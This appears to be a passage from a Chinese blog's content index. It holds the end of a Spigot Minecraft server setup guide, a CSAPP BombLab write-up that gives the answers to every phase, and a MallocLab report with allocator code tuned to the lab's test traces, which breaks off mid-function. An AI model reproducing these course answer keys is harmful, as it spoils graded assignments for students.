Finished at: 2022-07-01T12:59:46+08:00\n[INFO] -----------------------------------------------------------------------\nSuccess! Everything completed successfully. Copying final .jar files now.\nCopying spigot-1.16.5-R0.1-SNAPSHOT.jar to /opt/test_spigot/./spigot-1.16.5.jar\n  - Saved as ./spigot-1.16.5.jar\n```\n## 服务器初始化\n在jar包同级目录下新建start.sh文件，在文件内输入\n```bash\njava -Xmx[堆最大大小] -Xms[堆初始大小] -jar [构建出的jar包名字] nogui\n```\n\n> 关于启动参数的配置这里不再赘述，请根据自己的配置自行调节\n\n为该文件增加权限后运行该文件\n```bash\nsudo chmod +x start.sh\n./start.sh\n```\n第一次运行会显示如下错误\n```text\n[13:06:00] [main/ERROR]: Failed to load properties from file: server.properties\n[13:06:00] [main/WARN]: Failed to load eula.txt\n[13:06:00] [main/INFO]: You need to agree to the EULA in order to run the server. Go to eula.txt for more info\n```\n此时可以发现同级目录下新增了许多文件。将eula.txt文件中最后一句eula=false修改为eula=true，并重新运行该文件\n```bash\n./start.sh\n```\n等待地图生成完毕，如果出现以下信息，则说明开服成功\n```text\n[13:08:43] [Server thread/INFO]: Done (91.480s)! For help, type \"help\"\n```\n如果出现了以下警告信息\n```text\n[13:08:48] [Server thread/WARN]: Can't keep up! Is the server overloaded? Running 5097ms or 101 ticks behind\n```\n则说明了服务器配置较差，开服初期tps较低，待地图加载完毕后tps将会恢复正常\n## 安装screen\n若使用ssh远程连接服务器，则在关闭连接后服务器也会自动关闭，此时需要screen让服务器能在后台持续运行\n运行如下命令安装screen\n```bash\nsudo apt install screen\n```\n创建一个screen\n```bash\nscreen -S [screen的名字]\n```\n在screen内部和之前一样运行sh文件进行开服，唯一不同的是当关闭连接后服务器将仍然在后台运行\n重新进入该screen\n```bash\nscreen -r [screen的名字]\n```\n## 后续的配置\n> bukkit.yml和spigot.yml多用于服务器调优，这里不再赘述\n\nserver.properties中几个重要的配置：\n- gamemode   游戏模式\n- difficulty   游戏难度\n- pvp   是否允许pvp\n- max-player   最大玩家数量\n- server-port   服务器端口\n    - 如果是私服，不建议使用默认25565端口，防止有陌生人扫IP进入服务器 \n- view-distance   服务器视距\n    - 过大会造成玩家进入和重生时的卡顿，如果服务器带宽不足建议调整为6或者更低\n- online-mode   正版验证\n    - 建议开启 \n- motd   服务器简介","tags":["Minecraft","spigot"],"categories":["计软杂谈"]},{"title":"CSAPP - BombLab","url":"/reimu-lighthouse/20220619/csapp-bomblab/","content":"## 前置任务\n- 对bomb进行反汇编\n```shell\nobjdump -d bomb > bomb.txt\n```\n![0](https://d-sketon.top/img/csapp-bomblab/0.png)\n查看反编译后的结果可以知道每个阶段输入答案的指针都存入了%rdi（函数第一个参数），并将该参数传入phase_1~6函数\n## Phase 1\n![1](https://d-sketon.top/img/csapp-bomblab/1.png)\n将0x402400移入%esi并调用string_not_equal函数，而string_not_equal函数用于判断两个字符串是否相等，若相等则返回0，否则返回1\n349行string_not_equal比较输入字符和0x402400的内容\n![2](https://d-sketon.top/img/csapp-bomblab/2.png)\n350~351行将函数的返回值相与并判断结果是否为0，由于只有0&0的结果才为0，所以%rax不为0就会爆炸，即输入字符一定要和0x402400内的内容相等\n调用gdb查看0x402400：\n![3](https://d-sketon.top/img/csapp-bomblab/3.png)\n答案即为Border relations with Canada have never been better.\n## Phase 2\n![4](https://d-sketon.top/img/csapp-bomblab/4.png)\n360行栈顶指针赋值给%rsi，361行调用read_six_numbers函数，而read_six_number函数读入输入的六个数字并压入栈中\n![5](https://d-sketon.top/img/csapp-bomblab/5.png)\n362~364行比较栈顶元素（输入的第一个数）是否和1相等，如果不相等则爆炸，所以第一个数一定为1，跳到0x400f30:\n![6](https://d-sketon.top/img/csapp-bomblab/6.png)\n375~377行栈中第二个元素的指针赋值给%rbx，并将栈中第7个元素的指针（终止条件）赋值给%rbp，接着跳回0x400f17进入循环：\n![7](https://d-sketon.top/img/csapp-bomblab/7.png)\n%rbx本存着栈中第二个元素的指针，366行将指针向顶部移动，即将栈顶元素赋值给%eax,\n367行将%eax元素乘2，即%eax元素变为2\ngdb断点测试证实推测：\n![8](https://d-sketon.top/img/csapp-bomblab/8.png)\n368行将%eax和栈中第二个元素比较，如果不相等则爆炸，所以输入的第二个元素应该为2\n跳到0x400f25:\n![9](https://d-sketon.top/img/csapp-bomblab/9.png)\n%rbx中的指针向栈底移动，并和终止条件比较，如果没有到第六个元素则重新返回0x400f17\n归纳可得循环中：\n1.%eax存着栈中前一个元素的值\n2.%eax乘以二\n3.%eax和栈中后一个元素比较，如果相等则继续循环直到结束，否则直接爆炸\n答案即为1 2 4 8 16 32\n## Phase 3\n![10](https://d-sketon.top/img/csapp-bomblab/10.png)\n385~386行将栈中第个4元素的指针赋值给%rcx（函数第四个参数），第3个元素的指针赋值给%rdx（函数第三个参数）\n387~389行将0x4025cf赋值给%esi（函数第二个参数），将%eax置0，并调用sscanf函数\nsscanf函数的第一个参数表示输入源，第二个参数表示format参数，返回输入源按照format参数进行匹配的个数，并将匹配的字符串依次放入第三和第四个参数中\n调用gdb查看0x4025cf：\n![11](https://d-sketon.top/img/csapp-bomblab/11.png)\n390~392行如果函数返回值大于1（等于2）则不会爆炸，所以答案应为两个整数\n![12](https://d-sketon.top/img/csapp-bomblab/12.png)\n393行将栈中第三个元素（输入的第一个数字）和7进行比较，如果大于则爆炸，说明第一个数字范围在0~7\n395行将输入的第一个数字存入%eax，396行进入跳转表，跳转到0x402470+%rax\\*8\n调用gdb查看跳转表：\n![13](https://d-sketon.top/img/csapp-bomblab/13.png)\n根据跳转表查看汇编代码：\n![14](https://d-sketon.top/img/csapp-bomblab/14.png)\n%rax从0到7都有一一对应的跳转代码，说明有8种答案\n以第一个数字为0为例：\n根据跳转表跳转到397行，而在397行将%eax赋值为0xcf，并跳转到0x400fbe，比较%eax（0xcf）是否和栈中第四个元素相等，不相等则爆炸，所以当第一个数字为0时，第二个数字为207\n根据跳转表可以推断出其余7个答案：\n1 311\n2 707\n3 256\n4 389\n5 206\n6 682\n7 327\n## Phase 4\n![15](https://d-sketon.top/img/csapp-bomblab/15.png)\n![16](https://d-sketon.top/img/csapp-bomblab/16.png)\n前一部分和phase_3完全相同，输入应为两个整数，且放于栈中第三个位置和第四个位置中\n![17](https://d-sketon.top/img/csapp-bomblab/17.png)\n455行判断输入的第一个数字是否小于等于14且非负（无符号），否则爆炸\n![18](https://d-sketon.top/img/csapp-bomblab/18.png)\n457~460行%edx（第三个参数）赋值为14，%esi（第二个参数）赋值为0，%edi（第一个参数）赋值为输入的第一个数字，%rcx（第四个参数）之前赋值为输入的第二个数字，调用func4函数\n先分析func4后的代码：\n![19](https://d-sketon.top/img/csapp-bomblab/19.png)\n461~462行判断func4函数的返回值是否为0，不为0则爆炸\n463行判断输入的第二个数字是否为0，不为0则爆炸，所以输入的第二个数字一定为0\n由于func4函数中包含递归，所以选择反汇编为c语言：\n![20](https://d-sketon.top/img/csapp-bomblab/20.png)\n```c\nint a = 7, b = 0, c = 14, d = 0, rax;\nvoid func4()\n{\n    rax = ((int)(c - b + ((unsigned)(c - b) >> 31))) >> 1;\n    d = b + rax;\n    if (d > a)\n    {\n        c = d - 1;\n        func4();\n        rax = rax * 2;\n    }\n    else if (d < a)\n    {\n        rax = 0;\n        b = d + 1;\n        func4();\n        rax = rax * 2 + 1;\n    }\n    else if (d == a)\n        rax = 0;\n}\n```\n发现第一次进入函数中时d的值为7，而当输入的数也为7时为最简单的一种情况，即既不会进入（d>a）的递归，也不会进入（d\\<a）的递归，直接返回0\n\n> 除了最简单的7 0这一种情况，第一个数也可以为3或1或0\n\n## Phase 5\n![22](https://d-sketon.top/img/csapp-bomblab/22.png)\n472行将输入字符串的指针赋值给%rbx，476行清空%eax，477行调用string_length函数，478~480行如果函数返回值不为6则爆炸，说明答案为长度为6的字符串\n![23](https://d-sketon.top/img/csapp-bomblab/23.png)\n跳到0x4010d2将%eax清空，跳回0x40108b\n![24](https://d-sketon.top/img/csapp-bomblab/24.png)\n%rax等于0，所以482行%ecx为输入字符串的第一个字符，483行将第一个字符存入栈顶，484行~485行将第一个字符存入%rdx并与上0xf（相当于mod16），486行将%rdx+0x4024b0重新赋值给%rdx\n调用gdb查看0x4024b0：\n![25](https://d-sketon.top/img/csapp-bomblab/25.png)\n即%rdx中存放着maduiersnfotvbyl的第（输入的第一个数mod16）位的字符\n487行~490行将%rdx重新存入栈中向下0x10位，%rax加1并和6比较，如果不等于6则跳回0x4024b0进入循环\n归纳可得循环后：从栈中向下0x10位起起每个字节（共6个字节）存放着maduiersnfotvbyl的第（输入的第n数mod16）位的字符\n![26](https://d-sketon.top/img/csapp-bomblab/26.png)\n491行将0x10起第7个字节置0，492~496行将0x40245e赋值给%esi（第二个参数），将栈向下0x10位地址存入%rdi（第一个参数）并调用strings_not_equal函数，如果返回值不等于0则爆炸\n调用gdb查看0x40245e：\n![27](https://d-sketon.top/img/csapp-bomblab/27.png)\n说明栈中存放的内容应该为flyers，推得输入的字符串mod16后应该为12,18,17,6,7,8，通过ascii码反推可得输入的答案应该为ionefg\n## Phase 6\n![28](https://d-sketon.top/img/csapp-bomblab/28.png)\n518~519行将栈指针赋值给%r13和%rsi，并调用read_six_numbers函数，所以答案应为6个整数\nread_six_number函数将输入的数字依次存入栈中\n![29](https://d-sketon.top/img/csapp-bomblab/29.png)\n521~528行将栈指针赋值给%r14和%rbp，%r12d赋值为0（计数器），将栈顶第一个元素（输入的读一个数字）赋值给%eax，将%eax减1并和5比较，如果比5大就爆炸，说明输入的第一个数字不能大于6，且必须大于等于1（jbe比较的是无符号整数）\n![30](https://d-sketon.top/img/csapp-bomblab/30.png)\n529~531行将计数器%r12d加上1并判断是否等于6，如果等于6则跳出大循环进入0x401153\n如果不等于6则继续进入下一步：\n![31](https://d-sketon.top/img/csapp-bomblab/31.png)\n将计数器赋值给%ebx（第二个计数器）和%rax，并将栈中第%rax个元素重新赋值给%eax并和栈顶元素比较，如果相等则爆炸，如果不相等则进入下一步：\n![32](https://d-sketon.top/img/csapp-bomblab/32.png)\n538~542行%ebx加上1并和5比较，如果小于等于5则跳回0x401135重复比较栈中第%rax个元素和栈顶元素，如果大于5则将%r13加上4，跳会循环开始0x401114\n由此可以归纳上述二重循环代码：\n大循环比较输入的每个数字是否在1到6之间，小循环比较大循环中中第i位（i表示大循环了几轮）输入和之后输入的数字是否相等\n即输入的每个数字是否在1到6之间且互不相等\n![33](https://d-sketon.top/img/csapp-bomblab/33.png)\nc代码：\n```c\nint input[6] = { 1,2,3,4,5,6 };\nvoid phase_6()\n{\n    for (int i = 0; i < 6; i++)\n    {\n        if (input[i] > 6 || input[i] < 1)\n        {\n            cout << \"bomb\" << endl;\n            break;\n        }\n        for (int j = i + 1; j <= 5; j++)\n        {\n            if (input[i] == input[j])\n            {\n                cout << \"bomb\" << endl;\n                break;\n            }\n        }\n    }\n}\n```\n![35](https://d-sketon.top/img/csapp-bomblab/35.png)\n543~548行将栈中第七个元素存入%rsi（循环终止条件），将%r14（栈指针）赋值给%rax，将7赋值给%ecx，并将（7-栈顶元素）重新赋值回栈中，%rax向栈底移动一个元素，如果%rax不等于%rsi（终止条件）则循环上述操作（输入的整数取相反数并加7）\n循环跳出后将%esi（大循环的计数器）清零并跳到0x401197：\n![36](https://d-sketon.top/img/csapp-bomblab/36.png)\n%ecx首先存入栈顶元素，并和1比较，如果小于等于1则跳到0x401183：\n![37](https://d-sketon.top/img/csapp-bomblab/37.png)\n561~562行将0x6032d0存入栈顶向下0x20个字节的位置，563行将%rsi加上1并和0x18比较，如果相等则跳出循环，否则567行%ecx变为栈中第二个元素，继续和1比较\n而若栈中目前遍历到的元素大于1，则跳过跳转代码向下运行\n![38](https://d-sketon.top/img/csapp-bomblab/38.png)\n%eax（小循环的计数器，同样用作比较）置1，同样将0x6032d0存入%eax，并跳转到0x401176：\n![39](https://d-sketon.top/img/csapp-bomblab/39.png)\n555行%rdx加上0x8并将指针相对应的元素重新赋值给%rdx\n调用gdb查看0x6032d0：\n![40](https://d-sketon.top/img/csapp-bomblab/40.png)\n发现其为链表，而%rax加上0x8并将指针相对应的元素重新赋值相当于%rdx+0x10\n计数器%eax加1并和%ecx（栈中目前遍历到的元素）比较，如果不相等则跳回0x401176进行循环直到计数器%eax和%ecx相等，此时%rdx应该等于0x6032d0+0x10*（栈中目前遍历到的数字-1），跳到0x401188\n将%rdx的值赋值到栈中%rsi\\*2+0x20位置，并将%rsi（大循环计数器）加上0x4，并和0x18比较，如果不相等（没有遍历完六个元素）则继续循环，否则跳出循环进入0x4011ab\n由此可以归纳上述二重循环代码：\n每次将0x6032d0+0x10\\*（栈中目前遍历到的数字-1）赋值到栈中（栈中目前遍历到第几个数）\\*8+0x20位置\n即栈中从栈顶起向下（1）0x20，（2）00x28，（3）0x30，（4）0x38，（5）0x40，（6）0x48分别保存了0x6032d0+0x10\\*（6-ai）\n![41](https://d-sketon.top/img/csapp-bomblab/41.png)\n![42](https://d-sketon.top/img/csapp-bomblab/42.png)\n573~575行将栈顶起向下0x20的元素存入%rbx，将栈顶起向下0x28的地址存入%rax，将栈顶起向下0x50的地址存入%rsi（循环终止条件）\n576~578行将和%rcx栈中遍历到的指针所对应的节点的next地址（%rcx+0x8）置换为栈中遍历到的后一个指针（%rdx），%rax向后移动，并将%rax和终止条件比较，如果不相等则%rcx也向后移动并继续循环，否则跳到0x4011d2将最终的节点的指针置空\n（根据栈中存储的指针对链表进行重排）\n![43](https://d-sketon.top/img/csapp-bomblab/43.png)\n586行%ebp置5（计数器），%rax置为栈中第一个元素指针指向的节点的下一个节点指针，%rbx为栈中第一个元素指针，并将（%rax）低四字节和（%rbx）比较，如果（%rbx）比（%rax）小则爆炸，否则继续循环直到计数器为0，即从重排序链表的第二个节点开始依次比较前节点和该节点的低四位大小\n为了不爆炸，重排序链表应为降序，由此可反推：\n第1个数——>（924排第3位）——>-3+7=4\n第2个数——>（691排第4位）——>-4+7=3\n第3个数——>（477排第5位）——>-5+7=2\n第4个数——>（443排第6位）——>-6+7=1\n第5个数——>（332排第1位）——>-1+7=6\n第6个数——>（168排第2位）——>-2+7=5\n## Secret Phase\n分析phase_defused代码：\n![44](https://d-sketon.top/img/csapp-bomblab/44.png)\n891行清空%rax，892行判断0x603760是否和6相等，如果不相等则跳过了secret_phase函数，所以0x603760一定要等于6\n调用gdb在第一阶段结束后加断点，并查看0x603760：\n![45](https://d-sketon.top/img/csapp-bomblab/45.png)\n0x603760中存放的数字为1，所以0x603760存放了输入答案的次数，只有通过了phase_6才会进入secret_phase\n![46](https://d-sketon.top/img/csapp-bomblab/46.png)\n899行调用sscanf，900行函数返回值如果不等于3就会跳过secret_phase，说明%edi一定要和%esi匹配\n调用gdb查看0x402619（%esi）和0x603870（%edi）：\n![47](https://d-sketon.top/img/csapp-bomblab/47.png)\n0x603870中存放了第四阶段的输入，所以第四阶段应再输入一个字符串\n![48](https://d-sketon.top/img/csapp-bomblab/48.png)\n902行将0x402622赋值给%esi，903行将栈中第五个位置指针赋值给%rdi，904~906行调用strings_not_equal函数，比较%rdi和%esi所指向的内容字符串是否相等，不相等则跳过secret_phase函数，所以两者必须相等\n调用gdb查看0x402622：\n![49](https://d-sketon.top/img/csapp-bomblab/49.png)\n所以第四阶段答案应为7 0 DrEvil\n进入隐藏关卡：\n![50](https://d-sketon.top/img/csapp-bomblab/50.png)\n查看secret_phase函数代码：\n![51](https://d-sketon.top/img/csapp-bomblab/51.png)\n622行将输入的字符串转成相应的10进制长整型，623行将长整型赋值给%rbx，说明应输入一个整数\n![52](https://d-sketon.top/img/csapp-bomblab/52.png)\n624~627行如果输入的数字减一后大于1000则爆炸，说明输入的数字应该小于等于1001\n![53](https://d-sketon.top/img/csapp-bomblab/53.png)\n628行将%ebx，即输入的数字赋值给第二个参数，将0x6030f0赋值给第一个参数，并调用fun7\n先看fun7之后的代码：\n![54](https://d-sketon.top/img/csapp-bomblab/54.png)\n631~633行如果%rax不等于2就会爆炸，说明函数返回值一定是2\nfun7函数代码：\n![55](https://d-sketon.top/img/csapp-bomblab/55.png)\n![56](https://d-sketon.top/img/csapp-bomblab/56.png)\n首先传入的第一个参数如果等于0则会跳到0x401238将%eax赋值为0xffffffff，所以第一个参数不能等于0\n由于fun7函数中包含递归，所以选择反汇编为c语言：\n```c\nint x[]{36,8,50,22,45,6,107,40,1,99,35,7,20,47,1001};\nint rdx, input=20;\nint key=0;\nvoid fun7()\n{\n    if (key != 15)\n    {\n        rdx = x[key];    //key is address\n        if (rdx < input)\n        {\n            rax = 0;\n            key += 2;\n            fun7();\n            rax = 2 * rax + 1;\n        }\n        else if (rdx == input)\n            rax = 0;\n        else if (rdx > input)\n        {\n            key += 1;\n            fun7();\n            rax = rax * 2;\n        }\n    }\n    else\n        rax = 0xffffffff;\n}\n```\n![57](https://d-sketon.top/img/csapp-bomblab/57.png)\n由于函数最终%rax必须等于2，所以根据c语言代码确定%rax的最简单的递归顺序应该为0->1（2\\*rax+1）->2（rax=rax\\*2）\n调用gdb查看%rdi内存放的内容：\n![58](https://d-sketon.top/img/csapp-bomblab/58.png)\n从0x6030f0起内存被分成了15块节点，每个节点分成三个部分，第一个部分为数值，第二、三部分为指针\n可以推断出第一次节点初值为36，进入rdx > input部分，地址+0x8变为0x603110，值变为8，输入数字小于36\n第二次进入rdx < input部分，地址+0x10变为0x603150，值变为22，输入数字大于8\n第三次进入rdx=input部分，即输入数字等于22，且22大于8且小于36，所以22为答案\n![59](https://d-sketon.top/img/csapp-bomblab/59.png) \n\n> 22并不是唯一的答案，20也能通过隐藏关卡\n","tags":["CSAPP","深入理解计算机系统"],"categories":["计软杂谈"]},{"title":"CSAPP - MallocLab","url":"/reimu-lighthouse/20220619/csapp-malloclab/","content":"\n> 所有代码只针对测试数据进行特别优化，可能不具有普适性\n\n## 代码预览\n显式空闲链表+分离适配+realloc_bal测试点优化+binary_bal测试点优化\n### 宏定义\n![0](https://d-sketon.top/img/csapp-malloclab/0.png)\n宏定义和书本基本相同，但增加了PRED和SUCC两个宏用作定位空闲块中的前驱指针和后继指针，前驱指针保存在空闲块首起4个字节，而后继指针保存在后4个字节\n### 函数及全局变量声明\n![1](https://d-sketon.top/img/csapp-malloclab/1.png)\nroot指针数组用作分离适配器的空闲链表数组，维护着链表头\nMAX_SIZE为root数组的大小\nheap_listp为堆顶指针\n根据2的幂划分块的大小：{0~8}，{9~16}，{17~32}，...，{2049~4096}，{4097~∞}\n### mm_init函数\n![2](https://d-sketon.top/img/csapp-malloclab/2.png)\n相比于书上代码增加了对root的初始化，同时改变初始扩展堆的大小（原为CHUNKSIZE/WSIZE，现改为115字节），经过测试，改后代码能比原代码增加5分\n### extend_heap函数\n![3](https://d-sketon.top/img/csapp-malloclab/3.png)\n和书上代码相同\n### mm_malloc函数\n![4](https://d-sketon.top/img/csapp-malloclab/4.png)\n和书上代码基本相同，但由于place函数由void类型改为void*类型，同时改变形参数量，所以对place函数有关代码做出了调整\n### mm_free函数\n![5](https://d-sketon.top/img/csapp-malloclab/5.png)\n相比于书上代码增加了对于空闲块的前驱指针和后继指针的初始化操作\n### mm_realloc函数\n![6](https://d-sketon.top/img/csapp-malloclab/6.png)\nptr为空时直接调用mm_malloc函数，size为0时直接调用mm_free函数，否则\n首先将输入的size进行8字节对齐，得到asize\n接着判断ptr本身大小是否大于asize，如果小于等于则直接返回ptr指针（抛弃空闲区域），否则判断ptr后是否为空闲块且空闲块是最后一块，如果是则判断两者合并后是否放的下，如果放得下则直接更新ptr并返回，否则进行堆扩展并更新返回\n如果不满足上述所有情况则进行常规mm_malloc并进行内存复制\n### judge函数\n![7](https://d-sketon.top/img/csapp-malloclab/7.png)\n用于判断size大小的空闲块应该被放置在哪个空闲链表数组中\n### place函数\n![8](https://d-sketon.top/img/csapp-malloclab/8.png)\nflag用于判断调用者来源于malloc还是realloc函数（realloc函数无需进行relink操作）\n对于剩余部分大于2\\*DSIZE的情况，对asize进行判断，如果小于96（实际范围可以在80~110之间浮动，分数相同），则将空闲块放在右边，否则则将空闲块放在左边，放置的同时将空闲块的前驱和后继初始化并插入空闲链表中\n对于剩余部分小于2\\*DSIZE的情况，抛弃剩余空闲区域\n返回指针为分配块所对应指针\n### coalesce函数\n![9](https://d-sketon.top/img/csapp-malloclab/9.png)\n和书上代码基本类似，只是在对应情况下加上relink对应空闲块\n最后加上updatenode函数更新新的空闲块到对于空闲链表中\n### find_fit函数\n![10](https://d-sketon.top/img/csapp-malloclab/10.png)\n从对应空闲链表数组中开始寻找，首次适配，如果当前数组中没有找到则跳入下一下标中继续寻找，如果所有空闲块都无法放入则返回NULL\n### relink函数\n![11](https://d-sketon.top/img/csapp-malloclab/11.png)\n基础的空闲链表删除节点函数，最后对bp进行初始化\n### updatenode函数\n![12](https://d-sketon.top/img/csapp-malloclab/12.png)\n基础的空闲链表（OrderedList）插入节点函数，链表为升序排列，分头部插入和非头部插入两种情况\n## 优化原理\n- 采用**显式空闲链表**相对于隐式空闲链表，在插入的过程中只需遍历空闲链表而非整个堆，能大大加快速度\n- 采用**分离适配**，将将近大小的块放入一个链表中，类似于链式哈希表，能大大加快检索速度，同时由于优先遍历相近的块，所以相近大小的分配块会被分配到相近大小的空闲块中，提升内存利用率\n- 链表采用**升序排列**，**首次适配**，所以每次都能适配到最接近大小的空闲块，即最佳适配，能在牺牲一小部分速度的同时大大提升内存利用率\n- 针对realloc_bal和realloc2_bal测试点进行优化，注意到测试点中对同一块区域进行反复realloc，size升序排列，同时内部穿插alloc和free，此时若对于realloc的块直接向后扩展堆，同时抛弃空闲块，则不会打乱堆中的顺序，使内存利用率上升\n- 针对binary_bal和binary2_bal测试点进行优化，注意到测试点中先反复alloc小块和大块，之后一次性free大块并alloc更大的块，如果不进行优化，则由于之后alloc的块并不能被插入到之前free的块中（大小不够），所以会造成空间的大量浪费，而选择将大块的空闲块放在左边，小块的空闲块放在右边，当free大块时，小块的空闲块，大块的空闲块和大块free的空间都能相合并，形成一个更大的空间并能容纳下之后alloc的块，能大大提升内存利用率\n- 其他优化：改变mm_init中初始堆的大小，经测试，当初始堆的大小为115字节时有最大内存利用率（**仅对测试点进行优化，无普适性**）\n## 实验过程及分析\n\n> 详细注释请见完整代码\n\n- 使用书本上代码（隐式空闲链表）进行首次尝试\n![13](https://d-sketon.top/img/csapp-malloclab/13.png)\n可以发现内存的利用率只有74%，而且速度也很慢\n- 随后尝试将隐式改为显式空闲链表（LIFO）\n![14](https://d-sketon.top/img/csapp-malloclab/14.png)\n时间方面已经到达满分，之后需要对空间进行进一步优化\n- 考虑采用分离适配方法（LIFO），将块大小分解到131072大小\n![15](https://d-sketon.top/img/csapp-malloclab/15.png)\n内存利用率只有2%的提升，这也在意料之中，因为分离适配主要提升速度\n首先观察到最后4个测试点的内存利用率非常低，首先考虑优化最后两个测试点（realloc_bal和realloc2_bal）\n- 通过观察测试点后选择修改realloc函数如下\n![25](https://d-sketon.top/img/csapp-malloclab/25.png)\n![26](https://d-sketon.top/img/csapp-malloclab/26.png)\n即首先判断asize是否和copySize相等，如果相等则直接返回ptr，如果小于则调用place函数对分配块进行重新分配，否则则调用coalesce2函数（和coalesce函数类似），对于原块的前后寻找是否存在空闲块，如果存在则对其进行合并并重新分配，否则则重新alloc并内存复制\n- 此外修改updatenode函数代码，使其变为升序排列，这样就可以配合哈希表达到不损耗太多速度的同时进行最优适配\n![16](https://d-sketon.top/img/csapp-malloclab/16.png)\n此时内存利用率有了部分的提升\n- 接着考虑对后部空闲块直接扩展堆，即判断\n```c\n(( !GET_ALLOC(HDRP(NEXT_BLKP(ptr)))&&!GET_SIZE(HDRP(NEXT_BLKP(NEXT_BLKP(ptr))))))\n```\n- 在修改完代码并确认代码无误后却一直发生段错误\n![17](https://d-sketon.top/img/csapp-malloclab/17.png)\n在尝试了许多办法后发现将CHUNKSIZE的大小缩减到256字节后就不再发生段错误，推测可能是代码之间仍然存在逻辑错误，或是由于测试点的特殊性导致段错误，而将CHUNKSIZE进行了修改后正好改变了分配块在内存中的排布顺序，从而消除了段错误\n- 同时最后的测试点有了较大幅度的提升，已经到 97%\n![18](https://d-sketon.top/img/csapp-malloclab/18.png)\n随后尝试对binary_bal和binary2_bal测试点进行优化\n考虑按照块的大小选择place分配方式，即大块分在右边，而小块分在左边，分界线介于80~110字节之间\n- 但在修改完代码后发现\n![19](https://d-sketon.top/img/csapp-malloclab/19.png)\n所有测试点均在第六行发生负载覆盖问题，通过查看测试点可以知道第一次malloc可以正常执行，但在进行第二次malloc后就覆盖掉了第一次malloc的内容\n- 调试发现\n![20](https://d-sketon.top/img/csapp-malloclab/20.png)\n发现第一次将分配块（0xf697c118）的ALLOC置为1，但在 第二次malloc时ALLOC被隐式地修改回了0\n经过长时间的调试发现问题在于没有修改传入的bp指针，导致bp指针指向了错误的位置，而在之后malloc中影响到了之前的ALLOC\n所以将place函数从void类型修改为void *类型，将修改后的bp指针传出，并在malloc函数中更新bp指针即可消除负载覆盖的问题\n- 但这时又再次出现了段错误的问题\n![21](https://d-sketon.top/img/csapp-malloclab/21.png)\n经过排查发现是coalesce2函数中判断块的前部是否存在空闲块和place函数发生了冲突\n简单起见，直接暴力删除coalesce2中对于flag==2的情况，同时将CHUNKSIZE修改回4096\n- 修改后最后两个测试点发生error\n![22](https://d-sketon.top/img/csapp-malloclab/22.png)\n- 考虑coealesce2函数和其他许多函数可能发生了冲突，最后选择直接删除coalesce2整个函数\n![23](https://d-sketon.top/img/csapp-malloclab/23.png)\n分数提升到了92分\n最后通过重整代码和修改CHUNSIZE大小和初始堆的大小，成功再次提升5分\n- 最终实验结果\n![24](https://d-sketon.top/img/csapp-malloclab/24.png)\n## 完整代码\n```c\n/*\n * mm-naive.c - The fastest, least memory-efficient malloc package.\n * \n * In this naive approach, a block is allocated by simply incrementing\n * the brk pointer.  A block is pure payload. There are no headers or\n * footers.  Blocks are never coalesced or reused. Realloc is\n * implemented directly using mm_malloc and mm_free.\n *\n * NOTE TO STUDENTS: Replace this header comment with your own header\n * comment that gives a high level description of your solution.\n */\n#include <stdio.h>\n#include <stdlib.h>\n#include <assert.h>\n#include <unistd.h>\n#include <string.h>\n\n#include \"mm.h\"\n#include \"memlib.h\"\n/*********************************************************\n * NOTE TO STUDENTS: Before you do anything else, please\n * provide your team information in the following struct.\n ********************************************************/\nteam_t team = {\n    /* Team name */\n    \"ECNU SE\",\n    /* First member's full name */\n    \"Jack Qiu\",\n    /* First member's email address */\n    \"2055272094@qq.com\",\n    /* Second member's full name (leave blank if none) */\n    \"\",\n    /* Second member's email address (leave blank if none) */\n    \"\"};\n/* single word (4) or double word (8) alignment */\n#define ALIGNMENT 8\n/* rounds up to the nearest multiple of ALIGNMENT */\n#define ALIGN(size) (((size) + (ALIGNMENT - 1)) & ~0x7)\n\n#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))\n#define WSIZE 4\n#define DSIZE 8\n#define CHUNKSIZE 4096\n\n#define MAX(x, y) ((x) > (y) ? (x) : (y))\n#define PACK(size, alloc) ((size) | (alloc))\n#define GET(p) (*(unsigned int *)(p))\n#define PUT(p, val) (*(unsigned int *)(p) = (val))\n\n#define GET_SIZE(p) (GET(p) & ~0x7)\n#define GET_ALLOC(p) (GET(p) & 0x1)\n\n#define HDRP(bp) ((char *)(bp)-WSIZE)\n#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)\n\n#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp)-WSIZE)))\n#define PREV_BLKP(bp) ((char *)(bp)-GET_SIZE(((char *)(bp)-DSIZE)))\n\n#define PRED(bp) ((char *)(bp))         //返回前驱结点\n#define SUCC(bp) ((char *)(bp) + WSIZE) //返回后继结点\n\nstatic void *extend_heap(size_t words);\nstatic void *coalesce(void *bp);\nstatic void relink(void *bp);\nstatic void *find_fit(size_t size);\nstatic void* place(void *bp, size_t asize, int flag);\nstatic int judge(int size);\nstatic void updatenode(void *bp);\n\nconst int MAX_SIZE = 15;                //空闲链表数组大小\nstatic void *heap_listp = NULL;\nstatic unsigned int *root[15];          //空闲链表数组\n\nstatic int judge(int size)\n{\n    //相比于采用log，考虑采用if-else语句提升速度\n    int index = 0;\n    if (size <= 8)          index = 3;  //由于8字节对齐，size不可能小于8\n    else if (size <= 16)    index = 4;\n    else if (size <= 32)    index = 5;\n    else if (size <= 64)    index = 6;\n    else if (size <= 128)   index = 7;\n    else if (size <= 256)   index = 8;\n    else if (size <= 512)   index = 9;\n    else if (size <= 1024)  index = 10;\n    else if (size <= 2048)  index = 11;\n    else if (size <= 4096)  index = 12;\n    else                    index  =13;\n    return index;\n}\n\n/* \n * mm_init - initialize the malloc package.\n */\nint mm_init(void)\n{\n    if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *)-1)\n        return -1;\n    PUT(heap_listp, 0);\n    PUT(heap_listp + (1 * WSIZE), PACK(DSIZE, 1));\n    PUT(heap_listp + (2 * WSIZE), PACK(DSIZE, 1));\n    PUT(heap_listp + (3 * WSIZE), PACK(0, 1));\n    for (int i = 0; i < MAX_SIZE; i++)\n        root[i] = NULL;             //初始化空闲链表数组\n    heap_listp += (4 * WSIZE);\n    if (extend_heap(115) == NULL)   //对于测试点进行特别优化\n        return -1;\n    return 0;\n}\n\nstatic void *extend_heap(size_t words)\n{\n    char *bp;\n    size_t size;\n    size = (words % 2) ? (words + 1) * DSIZE : words * DSIZE;   //WSIZE修改为DSIZE\n    if ((long)(bp = mem_sbrk(size)) == -1)\n        return NULL;\n    PUT(HDRP(bp), PACK(size, 0));\n    PUT(FTRP(bp), PACK(size, 0));\n    PUT(PRED(bp), 0);       //前驱结点初始化\n    PUT(SUCC(bp), 0);       